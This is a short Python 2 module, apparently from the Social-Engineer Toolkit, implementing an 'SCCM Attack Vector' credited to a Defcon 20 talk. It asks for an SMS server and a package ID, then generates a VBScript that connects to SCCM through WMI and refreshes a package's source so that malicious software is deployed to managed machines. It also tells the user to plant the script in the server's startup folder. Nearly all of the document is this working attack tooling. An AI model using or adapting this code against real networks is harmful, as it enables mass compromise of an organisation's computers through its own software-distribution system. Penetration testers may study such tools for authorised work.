#!/usr/bin/python
from src.core.setcore import *
print "The" + bcolors.BOLD + " SCCM Attack Vector " + bcolors.ENDC + "will utilize the SCCM configurations to deploy malicious software. \n\nYou need to have the SMSServer name and a PackageID you want to package on the website. Then you need to copy this configuration file to the startup directory for all of the users on the server."

sms_server = raw_input("Enter the IP address or hostname of the SMS Server: ")
package_id = raw_input("Enter the Package ID of the package you want to patch: ")

configuration = '''
# configuration file written by Dave DeSimone and Bill Readshaw
# attack vector presented at Defcon 20
# added to set 07/27/2012

strSMSServer = "%s"
strPackageID = "%s"

Set objLoc =  CreateObject("WbemScripting.SWbemLocator")
Set objSMS= objLoc.ConnectServer(strSMSServer, "root\sms")
Set Results = objSMS.ExecQuery _
   ("SELECT * From SMS_ProviderLocation WHERE ProviderForLocalSite = true")
 For each Loc in Results
   If Loc.ProviderForLocalSite = True Then
     Set objSMS2 = objLoc.ConnectServer(Loc.Machine, "root\sms\site_"& _ 
        Loc.SiteCode)
     strSMSSiteCode = Loc.SiteCode
   end if
 Next

Set objPkgs = objSMS2.ExecQuery("select * from SMS_Package where PackageID = '" & strPackageID & "'")
for each objPkg in objPkgs
objPkg.RefreshPkgSource(0)
Next 
''' % (sms_server, package_id)

# write out the file to reports
filewrite = file("reports/sccm_configuration.txt", "w")
filewrite.write(configuration)
filewrite.close()
print_status("The SCCM configuration script has been successfully created.")
print_status("You need to copy the script to the startup folder of the server.")
print_status("Report has been exported to reports/sccm_configuration.txt")
pause = raw_input("Press " + bcolors.RED + "{return} " + bcolors.ENDC + "to exit this menu.")
